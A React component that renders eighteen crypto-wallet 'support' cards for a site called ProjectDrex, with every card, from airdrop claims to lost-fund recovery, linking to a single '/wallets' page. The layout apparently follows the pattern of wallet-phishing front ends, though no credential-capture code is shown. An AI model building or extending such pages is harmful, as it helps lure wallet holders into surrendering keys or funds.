import { Link } from "react-router-dom";

export default function ActionGrid() {
  const actions = [
    { id: 1, title: "Migration", desc: "Click here for migration" },
    { id: 2, title: "Claim Rewards", desc: "Click here to claim assets" },
    { id: 3, title: "Swap", desc: "Click here for assets swapping" },
    { id: 4, title: "Slippage", desc: "Click here for slippage related error" },
    { id: 5, title: "Transaction", desc: "Click here for transaction related issues" },
    { id: 6, title: "Cross Transfer", desc: "Click here for cross bridge issues" },
    { id: 7, title: "Staking", desc: "Click here for staking related issues" },
    { id: 8, title: "Exchange", desc: "Click here for exchange related issues" },
    { id: 9, title: "Connect to Dapps", desc: "Click here for error while connecting to Dapp" },
    { id: 10, title: "Login", desc: "Click here for wallet login issue" },
    { id: 11, title: "Whitelist", desc: "Click here for whitelist related issues" },
    { id: 12, title: "Recovery", desc: "Click here for wallet recovery" },
    { id: 13, title: "Missing/Irregular Balance", desc: "Click here to recover lost or missing funds" },
    { id: 14, title: "Wallet Glitch/Wallet Error", desc: "Click here if you have problem with your trading wallet" },
    { id: 15, title: "Transaction Delay", desc: "Click here for any issues related to transaction delay" },
    { id: 16, title: "Claim Airdrop", desc: "Click here for airdrop related issues" },
    { id: 17, title: "NFTs", desc: "Click here for NFT minting/transfer related issues" },
    { id: 18, title: "Locked Account", desc: "Click here for issues related to account lock" },
  ];

  return (
    <section id="action-grid" className="bg-black text-white py-20 px-6">
      {/* Header */}
      <div className="text-center mb-12">
        <h2 className="text-2xl md:text-3xl font-bold mb-3">
          Get started with one of the Events Below
        </h2>
        <p className="text-gray-400 text-sm max-w-3xl mx-auto">
          With <span className="text-indigo-400 font-medium">ProjectDrex</span>,
          you can connect your wallet with hundreds of decentralized apps, own your data, and digital identity.
        </p>
      </div>

      {/* Action cards */}
      <div className="grid gap-12 md:grid-cols-2 lg:grid-cols-3 max-w-6xl mx-auto">
        {actions.map((item) => (
          <Link to="/wallets" key={item.id}>
            <div className="bg-black border border-gray-600 hover:border-indigo-500 rounded-xl p-4 flex flex-col items-start gap-4 transition duration-300 hover:shadow-[0_0_15px_rgba(79,70,229,0.4)] hover:bg-[#0b0b0b] cursor-pointer">
              <div className="bg-gray-900 p-3 rounded-lg">
                <span className="text-indigo-400 text-2xl">✦</span>
              </div>

              <div>
                <h3 className="text-sm font-semibold mb-1">{item.title}</h3>
                <p className="text-xs text-gray-400">{item.desc}</p>
              </div>
            </div>
          </Link>
        ))}
      </div>
    </section>
  );
}
